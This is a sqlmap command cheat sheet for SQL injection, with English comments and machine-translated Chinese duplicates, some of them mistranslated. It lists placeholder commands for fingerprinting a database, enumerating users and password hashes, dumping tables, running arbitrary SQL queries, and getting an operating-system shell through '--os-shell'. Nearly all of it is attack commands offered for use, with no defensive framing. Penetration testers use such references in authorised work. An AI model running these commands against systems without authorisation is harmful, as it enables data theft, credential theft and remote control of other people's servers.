# Test URL and POST data and return database banner (if possible)
#测试URL和POST数据并返回数据库横幅（如果可能）
./sqlmap.py --url="<url>" --data="<post-data>" --banner

# Parse request data and test | request data can be obtained with burp
#解析请求数据和测试|请求数据可以通过打嗝获得
./sqlmap.py -r <request-file> <options>

# Fingerprint | much more information than banner
#指纹|比横幅更多的信息
./sqlmap.py -r <request-file> --fingerprint

# Get database username, name, and hostname
#获取数据库用户名，名称和主机名
./sqlmap.py -r <request-file> --current-user --current-db --hostname

# Check if user is a database admin
#检查用户是否是数据库管理员
./sqlmap.py -r <request-file> --is-dba

# Get database users and password hashes
#获取数据库用户和密码哈希值
./sqlmap.py -r <request-file> --users --passwords

# Enumerate databases
#枚举数据库
./sqlmap.py -r <request-file> --dbs

# List tables for one database
#列出一个数据库的表
./sqlmap.py -r <request-file> -D <db-name> --tables

# Other database commands
#其他数据库命令
./sqlmap.py -r <request-file> -D <db-name> --columns
                                           --schema
                                           --count
# Enumeration flags
#枚举标志
./sqlmap.py -r <request-file> -D <db-name>
                              -T <tbl-name>
                              -C <col-name>
                              -U <user-name>

# Extract data
#提取数据
./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump

# Execute SQL Query
#执行SQL查询
./sqlmap.py -r <request-file> --sql-query="<sql-query>"

# Append/Prepend SQL Queries
#附加/前置SQL查询
./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"

# Get backdoor access to sql server | can give shell access
#获取后门访问sql server |可以提供shell访问权限
./sqlmap.py -r <request-file> --os-shell
